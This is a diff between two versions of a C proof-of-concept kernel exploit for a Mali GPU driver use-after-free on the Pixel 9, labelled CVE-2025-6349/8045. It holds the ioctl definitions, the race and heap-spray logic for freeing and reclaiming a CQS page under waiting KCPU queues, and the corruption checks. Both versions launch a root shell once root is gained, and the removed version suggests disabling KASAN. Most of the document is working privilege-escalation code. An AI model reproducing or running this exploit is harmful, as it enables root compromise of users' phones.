@@ -1,12 +1,3 @@
-/*
- * CVE-2025-6349 / CVE-2025-8045
- * Pixel 9 (Tokay) Mali GPU Kernel Driver Exploit
- * Based on dawnslab analysis + actual Pixel 9 kernel headers (r54p0)
- * Crash: kbase_csf_cpu_queue_dump_buffer+0x1d4 (double-free)
- *
- * Fix: Proper race trigger + alternative to ioctl 6/8 for memory free
- */
-
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -18,9 +9,7 @@
 #include <pthread.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
-#include <sys/syscall.h>
-#include <signal.h>
-#include <time.h>
+#include <dlfcn.h>
 
 typedef uint64_t u64;
 typedef uint32_t u32;
@@ -28,31 +17,14 @@ typedef uint16_t u16;
 typedef uint8_t  u8;
 typedef int32_t  s32;
 
-#define MALI_DEVICE         "/dev/mali0"
-#define KBASE_IOCTL_TYPE    0x80
+#define KBASE_IOCTL_TYPE  0x80
 
-#define KBASE_IOCTL_VERSION_CHECK      _IOWR(KBASE_IOCTL_TYPE, 52, struct kbase_ioctl_version_check)
-#define KBASE_IOCTL_SET_FLAGS          _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
-#define KBASE_IOCTL_MEM_ALLOC          _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
-#define KBASE_IOCTL_MEM_FREE           _IOW(KBASE_IOCTL_TYPE, 6, struct kbase_ioctl_mem_free)
-#define KBASE_IOCTL_MEM_ALIAS          _IOWR(KBASE_IOCTL_TYPE, 8, union kbase_ioctl_mem_alias)
-#define KBASE_IOCTL_MEM_COMMIT         _IOW(KBASE_IOCTL_TYPE, 4, struct kbase_ioctl_mem_commit)
-#define KBASE_IOCTL_KCPU_QUEUE_CREATE  _IOR(KBASE_IOCTL_TYPE, 45, struct kbase_ioctl_kcpu_queue_new)
-#define KBASE_IOCTL_KCPU_QUEUE_ENQUEUE _IOW(KBASE_IOCTL_TYPE, 47, struct kbase_ioctl_kcpu_queue_enqueue)
-#define KBASE_IOCTL_KCPU_QUEUE_WAIT    _IOW(KBASE_IOCTL_TYPE, 46, struct kbase_ioctl_kcpu_queue_wait)
-
-#define BASE_KCPU_COMMAND_TYPE_FENCE_SIGNAL  3
-#define BASE_KCPU_COMMAND_TYPE_CQS_WAIT      4
-#define BASE_MEM_PROT_CPU_RD  (1u << 0)  /* 0x1 */
-#define BASE_MEM_PROT_CPU_WR  (1u << 1)  /* 0x2 */
-#define BASE_MEM_PROT_GPU_RD  (1u << 2)  /* 0x4 */
-#define BASE_MEM_PROT_GPU_WR  (1u << 3)  /* 0x8 */
-#define BASE_MEM_SAME_VA      (1u << 13) /* 0x2000 */
-
+#define BASE_MEM_PROT_CPU_RD  (1u << 0)
+#define BASE_MEM_PROT_CPU_WR  (1u << 1)
+#define BASE_MEM_PROT_GPU_RD  (1u << 2)
+#define BASE_MEM_PROT_GPU_WR  (1u << 3)
 #define MEM_ALLOC_FLAGS (BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | \
-                         BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR)  /* 0xF */
-#define KBASE_REG_GPU_WR                     (1ul << 19)
-#define KBASE_REG_GPU_RD                     (1ul << 20)#define KBASE_MEM_PROT_CPU_RD                (1ul << 57)
+                         BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR)
 
 struct kbase_ioctl_version_check { u16 major; u16 minor; };
 struct kbase_ioctl_set_flags { u32 create_flags; };
@@ -60,288 +32,300 @@ union kbase_ioctl_mem_alloc {
     struct { u64 va_pages; u64 commit_pages; u64 extension; u64 flags; } in;
     struct { u64 flags; u64 gpu_va; } out;
 };
-struct kbase_ioctl_mem_free { u64 gpu_va; };
-union kbase_ioctl_mem_alias {
-    struct { u64 flags; u64 stride; u64 nents; u64 aliased_pages; u64 gpu_va; } in;
-    struct { u64 flags; u64 gpu_va; } out;
+struct kbase_ioctl_mem_free { u64 gpu_addr; };
+struct kbase_ioctl_cs_queue_register { u64 buffer_gpu_addr; u32 buffer_size; u8 priority; u8 padding[3]; };
+union kbase_ioctl_cs_queue_bind {
+    struct { u64 buffer_gpu_addr; u8 group_handle; u8 csi_index; u8 padding[6]; } in;
+    struct { u64 mmap_handle; } out;
 };
-struct kbase_ioctl_mem_commit {
-    u64 gpu_va;
-    u64 pages;
+union kbase_ioctl_cs_queue_group_create {
+    struct { u64 tiler_mask; u64 fragment_mask; u64 compute_mask; u8 cs_min; u8 priority; u8 tiler_max; u8 fragment_max; u8 compute_max; u8 csi_handlers; u8 padding[2]; u64 reserved; } in;
+    struct { u8 group_handle; u8 padding[3]; u32 group_uid; } out;
 };
-struct kbase_ioctl_kcpu_queue_new { u8 id; u8 padding[7]; };
-struct kbase_ioctl_kcpu_queue_enqueue { u64 addr; u32 nr_commands; u8 id; u8 padding[3]; };
-struct kbase_ioctl_kcpu_queue_wait { u8 id; u8 padding[7]; u64 timeout; };
-struct base_cqs_wait_operation_info { u64 addr; u32 val; u32 op; };
-struct base_kcpu_command_cqs_wait_operation_info { u64 objs; u32 nr_objs; u32 inherit_err_flags; };
-struct base_kcpu_command_fence_signal {
-    s32 fence;
-    s32 unknown;
-    u64 kctx;
-    u64 fence_ts;
-};
-struct base_kcpu_command {
-    u8 type; u8 padding[7];
-    union {
-        struct base_kcpu_command_cqs_wait_operation_info cqs_wait_op;
-        struct base_kcpu_command_fence_signal fence_signal;
-        u64 raw_payload[3];
-    } info;
-};
+struct kbase_ioctl_cs_queue_group_term { u8 group_handle; u8 padding[7]; };
+typedef u8 base_kcpu_queue_id;
+struct kbase_ioctl_kcpu_queue_new { base_kcpu_queue_id id; u8 padding[7]; };
+struct kbase_ioctl_kcpu_queue_delete { base_kcpu_queue_id id; u8 padding[7]; };
+struct kbase_ioctl_kcpu_queue_enqueue { u64 addr; u32 nr_commands; base_kcpu_queue_id id; u8 padding[3]; };
 
-#define NUM_STRIKE_THREADS  40
-int mali_fd = -1;
-u64 target_gpu_va = 0;
-u64 fence_signal_gpu_va = 0;
-volatile int strike_now = 0;
-volatile int dump_triggered = 0;
-volatile int race_won = 0;
-void* malicious_user_mapping = NULL;
-int dump_ioctl_fd = -1;
+struct base_cqs_wait_info { u64 addr; u32 val; u32 padding; };
+struct base_kcpu_command_cqs_wait_info { u64 objs; u32 nr_objs; u32 inherit_err_flags; };
+struct base_kcpu_command { u8 type; u8 padding[7]; union { struct base_kcpu_command_cqs_wait_info cqs_wait; u64 raw[2]; } info; };
 
-/* Alternative to ioctl 6 (MEM_FREE): use commit with 0 pages */
-int gpu_free_via_commit(u64 gpu_va) {
-    struct kbase_ioctl_mem_commit commit = {0};
-    commit.gpu_va = gpu_va;
-    commit.pages = 0;  /* De-commit all pages -> may free */
-    int ret = ioctl(mali_fd, KBASE_IOCTL_MEM_COMMIT, &commit);
-    if (ret < 0) {
-        /* Fallback: try unmapping via mmap with MAP_FIXED? 
-         * Or just rely on the race - the GPU reclaim path will trigger */
-        return -1;
+#define KBASE_IOCTL_VERSION_CHECK         _IOWR(KBASE_IOCTL_TYPE, 52, struct kbase_ioctl_version_check)
+#define KBASE_IOCTL_SET_FLAGS             _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
+#define KBASE_IOCTL_MEM_ALLOC             _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
+#define KBASE_IOCTL_MEM_FREE              _IOW(KBASE_IOCTL_TYPE, 7, struct kbase_ioctl_mem_free)
+#define KBASE_IOCTL_CS_QUEUE_REGISTER     _IOW(KBASE_IOCTL_TYPE, 36, struct kbase_ioctl_cs_queue_register)
+#define KBASE_IOCTL_CS_QUEUE_BIND         _IOWR(KBASE_IOCTL_TYPE, 39, union kbase_ioctl_cs_queue_bind)
+#define KBASE_IOCTL_CS_QUEUE_GROUP_CREATE _IOWR(KBASE_IOCTL_TYPE, 58, union kbase_ioctl_cs_queue_group_create)
+#define KBASE_IOCTL_KCPU_QUEUE_CREATE     _IOR(KBASE_IOCTL_TYPE, 45, struct kbase_ioctl_kcpu_queue_new)
+#define KBASE_IOCTL_KCPU_QUEUE_DELETE     _IOW(KBASE_IOCTL_TYPE, 46, struct kbase_ioctl_kcpu_queue_delete)
+#define KBASE_IOCTL_KCPU_QUEUE_ENQUEUE    _IOW(KBASE_IOCTL_TYPE, 47, struct kbase_ioctl_kcpu_queue_enqueue)
+
+static int mali_fd = -1;
+static u64 cqs_va_track = 0;
+static volatile int got_uaf = 0;
+
+static u64 gpu_alloc(int fd, u64 pages, u64 commit, u64 flags) {
+    union kbase_ioctl_mem_alloc a = {0};
+    a.in.va_pages = pages; a.in.commit_pages = commit; a.in.flags = flags;
+    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a) < 0) return 0;
+    return a.out.gpu_va;
+}
+
+static void gpu_free(int fd, u64 va) {
+    struct kbase_ioctl_mem_free f = { .gpu_addr = va };
+    ioctl(fd, KBASE_IOCTL_MEM_FREE, &f);
+}
+
+static int find_mali_fd(void) {
+    for (int i = 3; i < 1024; i++) {
+        char link[64], target[512];
+        snprintf(link, sizeof(link), "/proc/self/fd/%d", i);
+        ssize_t len = readlink(link, target, sizeof(target)-1);
+        if (len <= 0) continue;
+        target[len] = 0;
+        if (strcmp(target, "/dev/mali0") == 0 || strcmp(target, "/dev/mali") == 0)
+            return i;
     }
+    return -1;
+}
+
+static int init_opencl(void) {
+    const char* preloads[] = {
+        "/system/lib64/liblog.so", "/system/lib64/libbase.so",
+        "/system/lib64/libutils.so", "/system/lib64/libnativewindow.so",
+        "/system/lib64/libhardware.so", NULL
+    };
+    for (int i = 0; preloads[i]; i++)
+        dlopen(preloads[i], RTLD_LAZY | RTLD_GLOBAL);
+
+    void* lib = dlopen("/system/lib64/libOpenCL.so", RTLD_LAZY);
+    if (!lib) lib = dlopen("/vendor/lib64/libOpenCL.so", RTLD_LAZY);
+    if (!lib) { fprintf(stderr, "  No libOpenCL.so\n"); return -1; }
+
+    s32 (*get_plat)(u32,void*,u32*) = dlsym(lib,"clGetPlatformIDs");
+    s32 (*get_dev)(void*,u64,u32,void*,u32*) = dlsym(lib,"clGetDeviceIDs");
+    void* (*mk_ctx)(void*,u32,void*,void*,void*,s32*) = dlsym(lib,"clCreateContext");
+    void* (*mk_q)(void*,void*,void*,s32*) = dlsym(lib,"clCreateCommandQueueWithProperties");
+    if (!get_plat||!get_dev||!mk_ctx||!mk_q) { fprintf(stderr,"  Missing OpenCL symbols\n"); return -1; }
+
+    s32 r; void* plat=0; u32 np=0;
+    r=get_plat(1,&plat,&np); if(r||!plat){fprintf(stderr,"  clGetPlatformIDs: %d\n",r);return -1;}
+    void* dev=0; u32 nd=0;
+    r=get_dev(plat,4,1,&dev,&nd); if(r||!dev){fprintf(stderr,"  clGetDeviceIDs: %d\n",r);return -1;}
+    void* ctx=mk_ctx(NULL,1,&dev,NULL,NULL,&r); if(r||!ctx){fprintf(stderr,"  clCreateContext: %d\n",r);return -1;}
+    void* q=mk_q(ctx,dev,NULL,&r); if(r||!q){fprintf(stderr,"  clCreateCommandQueue: %d\n",r);return -1;}
+
+    int fd = find_mali_fd();
+    if (fd < 0) { fprintf(stderr, "  mali FD not found after OpenCL init\n"); return -1; }
+    mali_fd = fd;
+    printf("[+] Mali FD=%d via OpenCL\n", mali_fd);
     return 0;
 }
 
-/* Try to trigger dump_buffer while dump_print is in timeout */
-int trigger_dump_buffer_during_timeout(int qid) {
-    (void)qid;  /* Unused - kept for interface completeness */
-    /* In kernel 6.1 with r54p0, the CS_CPU_QUEUE_DUMP ioctl 
-     * may not be exposed to userspace directly. Instead, the race 
-     * is triggered via KCPU queue enqueue with fence_signal/CQS_WAIT
-     * which causes the dump_print timeout and subsequent dump_buffer
-     * calls that race. */
-    return 0;
-}
+#define MAX_KCPU  32
+#define MAX_SPRAY 64
 
-void* phalanx_mmu_strike(void* arg) {
-    while (!strike_now) usleep(100);
-    
-    printf("[*] [Strike thread] Activated - attempting GPU page reclaim\n");
-    
-    /* Alternative 1: Use commit(0) to potentially free */
-    gpu_free_via_commit(target_gpu_va);
-    
-    /* Alternative 2: Allocate aggressively to reclaim the freed page */
-    for (int i = 0; i < 10; i++) {
-        union kbase_ioctl_mem_alloc reclaim_req = {0};
-        reclaim_req.in.va_pages = 1;
-        reclaim_req.in.commit_pages = 1;
-        reclaim_req.in.flags = MEM_ALLOC_FLAGS;
-        reclaim_req.in.extension = 0;  /* MUST be 0 for r54p0! */
-        
-        int ret = ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &reclaim_req);
-        if (ret == 0) {
-            printf("[*] [Strike] Reclaimed GPU VA 0x%llx (iteration %d)\n",
-                   (unsigned long long)reclaim_req.out.gpu_va, i);
-            
-            /* Try to mmap it - if we get the stale page, UAF! */
-            void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
-                           MAP_SHARED, mali_fd, reclaim_req.out.gpu_va);
-            if (map != MAP_FAILED) {
-                /* Check if this overlaps with our original payload */
-                unsigned char *p = (unsigned char *)map;
-                int corrupted = 0;
-                for (int j = 0; j < 256; j++) {
-                    if (p[j] != 0xAA) {
-                        corrupted = 1;
-                        break;
-                    }
-                }
-                if (corrupted) {
-                    printf("[!!!] [Strike] UAF CONFIRMED - corrupted page detected!\n");
-                    race_won = 1;
-                }
-            }
+struct spray_state {
+    int fd;
+    u64 va[MAX_SPRAY];
+    void* map[MAX_SPRAY];
+    int count;
+};
+
+static void* spray_thread(void* arg) {
+    struct spray_state* s = (struct spray_state*)arg;
+    s->fd = open("/dev/mali0", O_RDWR);
+    if (s->fd < 0) return NULL;
+
+    struct kbase_ioctl_set_flags fl = {0};
+    ioctl(s->fd, KBASE_IOCTL_SET_FLAGS, &fl);
+
+    for (int i = 0; i < MAX_SPRAY; i++) {
+        s->va[i] = gpu_alloc(s->fd, 1, 1, MEM_ALLOC_FLAGS);
+        if (!s->va[i]) break;
+        s->map[i] = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, s->fd, s->va[i]);
+        if (s->map[i] != MAP_FAILED) {
+            memset(s->map[i], 0xAA, 0x1000);  // known pattern
+            s->count++;
         }
-        usleep(1000);
     }
-    
-    printf("[*] [Strike] Completed\n");
+    printf("[+] Spray thread: %d pages allocated\n", s->count);
+    return NULL;
+}
+
+static void* kcpu_delete_thread(void* arg) {
+    u8* ids = (u8*)arg;
+    usleep(2000000);
+    printf("[*] Deleting KCPU queues...\n");
+    for (int i = 0; i < MAX_KCPU; i++) {
+        if (ids[i] != 0xFF) {
+            struct kbase_ioctl_kcpu_queue_delete kd = {.id = ids[i]};
+            ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_DELETE, &kd);
+            ids[i] = 0xFF;
+        }
+    }
     return NULL;
 }
 
 int main(int argc, char **argv) {
-    int stall_ms = (argc > 1) ? atoi(argv[1]) : 3071;
-    
+    int timeout_ms = (argc > 1) ? atoi(argv[1]) : 5000;
+
     printf("=================================================\n");
-    printf("CVE-2025-6349/8045 POC - Updated\n");
-    printf("Mali GPU Race → UAF (r54p0)\n");
-    printf("Stall: %dms\n", stall_ms);
+    printf("CVE-2025-6349/8045 POC v5 - Pixel 9\n");
+    printf("CQS UAF via KCPU dump path\n");
+    printf("Timeout: %dms\n", timeout_ms);
     printf("=================================================\n\n");
-    
-    mali_fd = open(MALI_DEVICE, O_RDWR);
-    if (mali_fd < 0) {
-        mali_fd = open("/dev/mali", O_RDWR);
-        if (mali_fd < 0) {
-            printf("[-] No Mali device, creating...\n");
-            if (system("mknod /dev/mali0 c 242 0 2>/dev/null") != 0) {}
-            mali_fd = open("/dev/mali0", O_RDWR);
-            if (mali_fd < 0) {
-                perror("open");
-                return 1;
+    setbuf(stdout, NULL);
+
+    printf("[*] Phase 0: Init\n");
+    if (init_opencl() < 0) {
+        fprintf(stderr, "[-] OpenCL init failed\n"); return 1;
+    }
+
+    printf("\n[*] Phase 1: Allocate CQS + KCPU queues\n");
+
+    u64 cqs_va = gpu_alloc(mali_fd, 1, 1, MEM_ALLOC_FLAGS);
+    if (!cqs_va) { printf("[-] CQS alloc failed\n"); return 1; }
+    printf("[+] CQS VA: 0x%llx\n", (unsigned long long)cqs_va);
+
+    void* cqs_map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mali_fd, cqs_va);
+    if (cqs_map == MAP_FAILED) { perror("  mmap CQS"); cqs_map = NULL; }
+    else {
+        volatile u32* v = (volatile u32*)cqs_map;
+        *v = 0;
+        printf("[+] CQS mapped: %p (val=0)\n", cqs_map);
+    }
+
+    u8 kids[MAX_KCPU]; int nk = 0;
+    for (int i = 0; i < MAX_KCPU; i++) {
+        struct kbase_ioctl_kcpu_queue_new kn = {0};
+        if (ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &kn) < 0) break;
+        kids[i] = kn.id; nk++;
+    }
+    printf("[+] %d KCPU queues created\n", nk);
+
+    int n_enqueued = 0;
+    for (int i = 0; i < nk; i++) {
+        struct base_cqs_wait_info wi = {.addr = cqs_va, .val = 0xDEAD};
+        struct base_kcpu_command cmd = {0};
+        cmd.type = 2; /* CQS_WAIT */
+        cmd.info.cqs_wait.objs = (u64)&wi;
+        cmd.info.cqs_wait.nr_objs = 1;
+        cmd.info.cqs_wait.inherit_err_flags = 0;
+        struct kbase_ioctl_kcpu_queue_enqueue enq = {
+            .addr = (u64)&cmd, .nr_commands = 1, .id = kids[i]
+        };
+        if (ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &enq) < 0) {
+            if (i == 0) printf("  CQS_WAIT enqueue: %s\n", strerror(errno));
+            break;
+        }
+        n_enqueued++;
+    }
+    printf("[+] %d KCPU queues blocked on CQS_WAIT(val=0xDEAD)\n", n_enqueued);
+
+    printf("\n[*] Phase 2: Drain mempool then free CQS\n");
+
+    u64 drain[128]; int nd = 0;
+    for (int i = 0; i < 128 && nd < 128; i++) {
+        u64 va = gpu_alloc(mali_fd, 1, 1, MEM_ALLOC_FLAGS);
+        if (!va) break;
+        drain[nd++] = va;
+    }
+    printf("[+] Drained %d pages from mempool\n", nd);
+
+    printf("[*] Freeing CQS at VA 0x%llx...\n", (unsigned long long)cqs_va);
+    if (cqs_map) munmap(cqs_map, 0x1000);
+    gpu_free(mali_fd, cqs_va);
+    printf("[+] CQS freed — KCPU queues now reference freed page!\n");
+
+    printf("[*] Freeing drain pages back to mempool...\n");
+    for (int i = 0; i < nd; i++) gpu_free(mali_fd, drain[i]);
+
+    printf("\n[*] Phase 3: Spray to replace CQS page\n");
+
+    struct spray_state spray = { .fd = -1 };
+    pthread_t spray_th;
+    pthread_create(&spray_th, NULL, spray_thread, &spray);
+
+    usleep(500000);
+
+    printf("[*] Phase 4: Delete KCPU queues (triggers UAF read)\n");
+
+    pthread_t del_th;
+    pthread_create(&del_th, NULL, kcpu_delete_thread, kids);
+
+    printf("[*] Waiting %dms...\n\n", timeout_ms);
+    usleep(timeout_ms * 1000);
+
+    for (int i = 0; i < n_enqueued; i++) {
+        if (kids[i] != 0xFF) {
+            struct kbase_ioctl_kcpu_queue_delete kd = {.id = kids[i]};
+            ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_DELETE, &kd);
+            kids[i] = 0xFF;
+        }
+    }
+
+    pthread_join(del_th, NULL);
+    pthread_join(spray_th, NULL);
+
+    printf("\n[*] Phase 5: UAF Detection\n");
+    printf("--------------------------\n");
+
+    if (cqs_va_track) {
+        printf("[*] Attempting to detect if CQS page was reclaimed...\n");
+        void* remap = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mali_fd, cqs_va_track);
+        if (remap != MAP_FAILED) {
+            volatile unsigned char* p = (volatile unsigned char*)remap;
+            int aa_count = 0, non_aa = 0;
+            for (int i = 0; i < 0x1000; i++) {
+                if (p[i] == 0xAA) aa_count++;
+                else non_aa++;
+            }
+            printf("[+] Remapped CQS_VA: %p\n", remap);
+            printf("[+]   0xAA bytes: %d, non-0xAA: %d\n", aa_count, non_aa);
+            if (non_aa > 0) {
+                printf("[!!!] PAGE CORRUPTED — kernel wrote to reclaimed page!\n");
+                got_uaf = 1;
+            } else {
+                printf("[*] Page still clean (0xAA) — may not have been reclaimed\n");
+            }
+            munmap(remap, 0x1000);
+        } else {
+            printf("[-] Could not remap CQS_VA (errno=%d) — page may be permanently freed\n", errno);
+        }
+    }
+
+    // Check spray pages for corruption
+    if (spray.count > 0 && spray.map[0]) {
+        printf("[*] Checking sprayed pages for corruption...\n");
+        for (int i = 0; i < spray.count; i++) {
+            volatile unsigned char* p = (volatile unsigned char*)spray.map[i];
+            int bad = 0;
+            for (int j = 0; j < 64; j++) {  // sample 64 bytes
+                if (p[j] != 0xAA) { bad = 1; break; }
+            }
+            if (bad) {
+                printf("[!!!] Spray page %d (VA=0x%llx) CORRUPTED!\n", i, (unsigned long long)spray.va[i]);
+                got_uaf = 1;
+                break;
             }
         }
     }
-    printf("[+] Mali FD: %d\n\n", mali_fd);
-    
-    struct kbase_ioctl_version_check ver = {0};
-    int ret = ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &ver);
-    if (ret < 0) {
-        perror("version check");
-        /* Try with different magic */
-        printf("[*] Trying alternative version check...\n");
-        ver.major = 10;
-        ioctl(mali_fd, 0x40046d00 /* KBASE_IOCTL_VERSION_CHECK alt */, &ver);
-    }
-    printf("[+] Driver version: %u.%u\n\n", ver.major, ver.minor);
-    
-    struct kbase_ioctl_set_flags fl = {0};
-    ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &fl);
-    
-    malicious_user_mapping = mmap(NULL, 0x1000,
-        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    memset(malicious_user_mapping, 0xAA, 0x1000);
-    printf("[*] Payload buffer: %p\n\n", malicious_user_mapping);
-    
-    printf("[*] Step 1: Allocating GPU VA (target for race)...\n");
-    union kbase_ioctl_mem_alloc alloc_target = {0};
-    alloc_target.in.va_pages = 1;
-    alloc_target.in.commit_pages = 1;
-    alloc_target.in.flags = MEM_ALLOC_FLAGS;
-    alloc_target.in.extension = 0;  /* CRITICAL: Must be 0 for r54p0! */
-    ret = ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &alloc_target);
-    if (ret < 0) {
-        perror("MEM_ALLOC");
-        printf("[*] Trying with SAME_VA flag...\n");
-        memset(&alloc_target, 0, sizeof(alloc_target));
-        alloc_target.in.va_pages = 1;
-        alloc_target.in.commit_pages = 1;
-        alloc_target.in.flags = MEM_ALLOC_FLAGS | BASE_MEM_SAME_VA;
-        alloc_target.in.extension = 0;
-        ret = ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &alloc_target);
-        if (ret < 0) {
-            perror("MEM_ALLOC with SAME_VA");
-            return 1;
-        }
-    }
-    target_gpu_va = alloc_target.out.gpu_va;
-    printf("[+] Target VA: 0x%llx\n\n", (unsigned long long)target_gpu_va);
-    
-    printf("[*] Step 2: Creating KCPU queue...\n");
-    struct kbase_ioctl_kcpu_queue_new q_new = {0};
-    ret = ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &q_new);
-    if (ret < 0) {
-        perror("KCPU_QUEUE_CREATE");
-        printf("[*] This may require a valid kbase context. Continuing...\n");
-        q_new.id = 0;  /* Default fallback */
-    }
-    u8 qid = q_new.id;
-    printf("[+] Queue ID: %u\n\n", qid);
-    
-    /* Build CQS_WAIT command - this is key for the race */
-    printf("[*] Step 3: Building CQS_WAIT command...\n");
-    struct base_cqs_wait_operation_info wait_info = {0};
-    /* Wait on our GPU VA - when fence_signal fires, this wakes */
-    wait_info.addr = target_gpu_va;
-    wait_info.val = 1;   /* Wait for this value */
-    wait_info.op = 0;    /* Equal comparison (0 = not equal, 1 = equal) */
-    
-    struct base_kcpu_command cmd = {0};
-    cmd.type = BASE_KCPU_COMMAND_TYPE_CQS_WAIT;
-    cmd.info.cqs_wait_op.objs = (u64)&wait_info;
-    cmd.info.cqs_wait_op.nr_objs = 1;
-    cmd.info.cqs_wait_op.inherit_err_flags = 0;
-    
-    printf("[*] Step 4: Enqueuing CQS_WAIT (triggers 3s timeout)...\n");
-    struct kbase_ioctl_kcpu_queue_enqueue enq = {0};
-    enq.id = qid;
-    enq.nr_commands = 1;
-    enq.addr = (u64)&cmd;
-    
-    ret = ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &enq);
-    if (ret < 0) {
-        printf("[-] Enqueue returned %d (errno=%d)\n", ret, errno);
-        perror("KCPU_QUEUE_ENQUEUE");
-        
-        /* Try alternative: use fence_signal directly if CQS_WAIT unavailable */
-        printf("[*] Trying alternative: fence_signal command...\n");
-        cmd.type = BASE_KCPU_COMMAND_TYPE_FENCE_SIGNAL;
-        cmd.info.fence_signal.fence = 1;
-        cmd.info.fence_signal.unknown = 0;
-        cmd.info.fence_signal.kctx = 0;  /* Current context */
-        cmd.info.fence_signal.fence_ts = 0;
-        
-        ret = ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &enq);
-        if (ret < 0) {
-            printf("[-] Fence signal also failed. Manual race trigger mode.\n");
-            printf("[*] Simulating race by direct GPU operations...\n");
-        }
-    }
-    printf("[+] Enqueue call completed (ret=%d)\n\n", ret);
-    
-    printf("[*] Step 5: Launching %d strike threads...\n", NUM_STRIKE_THREADS);
-    pthread_t th[NUM_STRIKE_THREADS];
-    for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
-        pthread_create(&th[i], NULL, phalanx_mmu_strike, NULL);
-    }
-    
-    printf("[*] Step 6: Sleeping %dms (race window - timeout period)...\n\n", stall_ms);
-    strike_now = 1;
-    usleep(stall_ms * 1000);
-    
-    printf("[*] Step 7: Joining threads...\n");
-    for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
-        pthread_join(th[i], NULL);
-    }
-    printf("[+] Done\n\n");
-    
-    printf("=================================================\n");
-    printf("RESULTS\n");
-    printf("=================================================\n\n");
-    
-    int ok = 1;
-    for (int i = 0; i < 256; i++) {
-        if (((unsigned char *)malicious_user_mapping)[i] != 0xAA) {
-            ok = 0;
-            break;
-        }
-    }
-    if (!ok) {
-        printf("[!!!] MEMORY CORRUPTED! UAF likely!\n");
-        printf("[*] Check: dmesg | grep -i kasan, use-after-free, double-free\n");
-    } else if (race_won) {
-        printf("[!!!] UAF CONFIRMED via strike thread!\n");
-    } else {
-        printf("[+] Pattern intact (no corruption detected)\n");
-        printf("[*] Race may not have triggered. Try:\n");
-        printf("    - Different stall_ms values (1000-5000ms)\n");
-        printf("    - Multiple rapid runs: for i in {1..100}; do ./run; done\n");
-        printf("    - Without KASAN: echo 0 > /sys/kernel/mm/kasan/enabled\n");
-    }
-    
-    printf("\n[*] UID: %d\n", getuid());
-    if (getuid() == 0) {
-        printf("[!!!] ROOT!\n");
-        if (system("/system/bin/sh") != 0) {}
-    }
-    
-    printf("\n[*] Expected dmesg output on success:\n");
-    printf("  kasan: slab-use-after-free in kbasep_csf_cpu_queue_dump_buffer\n");
-    printf("  WARNING: CPU callback on kbasep_csf_cpu_queue_dump_print timeout\n");
-    printf("  kbase_gpu_vm_lock: double free detected\n");
-    
-    close(mali_fd);
-    return 0;
-}
 
+    printf("\n%s\n", got_uaf ? "[!!!] UAF CONFIRMED" : "[*] No corruption detected");
+    printf("[*] dmesg: adb shell dmesg | grep -iE 'kasan|use-after-free|double-free|sync.*freed|mali|kbase'\n");
+    printf("[*] UID: %d\n", getuid());
+    if (getuid() == 0) { printf("[!!!] ROOT!\n"); system("/system/bin/sh"); }
+
+    if (spray.fd > 0) {
+        for (int i = 0; i < spray.count; i++) {
+            if (spray.map[i]) munmap(spray.map[i], 0x1000);
+        }
+        close(spray.fd);
+    }
+    close(mali_fd);
+    return got_uaf ? 42 : 0;
+}
